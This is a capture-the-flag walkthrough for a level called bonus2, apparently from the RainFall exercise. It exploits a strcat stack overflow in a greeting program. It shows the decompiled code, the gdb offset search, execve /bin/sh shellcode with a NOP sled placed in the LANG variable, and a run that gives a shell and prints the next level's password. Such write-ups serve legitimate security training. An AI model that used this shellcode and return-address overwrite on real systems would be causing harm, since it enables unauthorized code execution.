this is a challenge where we will use the environment to exploit.

it's a program that takes 2 args , puts them in a buffer one after another using `strncpy`, sets a global variable `language` to a value depending on env variable `LANG` then calls a function `greetuser`.

```c
int main(int ac, char **av) {
    char    buf[76];

    if (ac != 3)
        return 1;

    memset(buf, 0, sizeof(buf));

    strncpy(buf, av[1], 40);
    strncpy(buf + 40, av[2], 32);

    char    *lang = getenv("LANG");
    if (lang) {
        if (memcmp(lang, "fi", 2) == 0)
            language = 1;
        if (memcmp(lang, "nl", 2) == 0)
            language = 2;
    }

    greetuser(buf);

    return 0;
}
```

`greetuser` concatinate a greeting that changes in language depending on `language` variable with our buffer in main then prints it using `puts`.

```c
void greetuser(char *buf) {
    char    greeting[72];
    char    *greet;

    if (language == 1)
        greet = "Hyvää päivää ";
    else if (language == 2)
        greet = "Goedemiddag! ";
    else
        greet = "Hello ";
    
    strcpy(greeting, greet);
    strcat(greeting, buf);

    puts(greeting);
}
```

depending on which language is chosen you can overwrite `greetuser` return address.

first of all let's change the LANG env variable

```bash
export LANG="fi"
```

now lets try to find the offset to return address

```bash
(gdb) r $(python -c 'print "A" * 40') $(python -c 'print "B"*18 + "\xef\xbe\xad\xde"')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B"*18 + "\xef\xbe\xad\xde"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBﾭ�

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
(gdb) 
```

and put our shellcode in env

```bash
export LANG=$(python -c 'print "fi" + "\x90" * 60 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```

using gdb we can find where our shellcode will approximalty be

```bash
Breakpoint 1, 0x0804852f in main ()
(gdb) x/10s *(char **)environ
0xbffff8c0:	 "SHELL=/bin/bash"
0xbffff8d0:	 "TERM=xterm-256color"
0xbffff8e4:	 "SSH_CLIENT=10.12.8.3 46386 4242"
0xbffff904:	 "SSH_TTY=/dev/pts/0"
0xbffff917:	 "USER=bonus2"
0xbffff923:	 "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
0xbffff9eb:	 ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
0xbffffab3:	 "eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"...
0xbffffb7b:	 ":*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mk"...
0xbffffc43:	 "v=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35"...
(gdb) x/20s *(char **)environ
0xbffff8c0:	 "SHELL=/bin/bash"
0xbffff8d0:	 "TERM=xterm-256color"
0xbffff8e4:	 "SSH_CLIENT=10.12.8.3 46386 4242"
0xbffff904:	 "SSH_TTY=/dev/pts/0"
0xbffff917:	 "USER=bonus2"
0xbffff923:	 "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
0xbffff9eb:	 ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
0xbffffab3:	 "eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"...
0xbffffb7b:	 ":*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mk"...
0xbffffc43:	 "v=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35"...
0xbffffd0b:	 ":*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00"...
0xbffffdd3:	 ";36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
0xbffffe44:	 "COLUMNS=211"
0xbffffe50:	 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
0xbffffe9d:	 "MAIL=/var/mail/bonus2"
0xbffffeb3:	 "_=/usr/bin/gdb"
0xbffffec2:	 "PWD=/home/user/bonus2"
0xbffffed8:	 "LANG=nl\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211\302\260\v\315\200\061\300@\315\200"
0xbfffff38:	 "LINES=53"
0xbfffff41:	 "HOME=/home/user/bonus2"
```

now we have all we need, (the `nop slide` => `"\x90" * 60` will help us slide to our shellcode):

```bash
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B"*18 + "\x10\xff\xff\xbf"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB���
$ pwd
/home/user/bonus2
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$ 
```

and there you go.
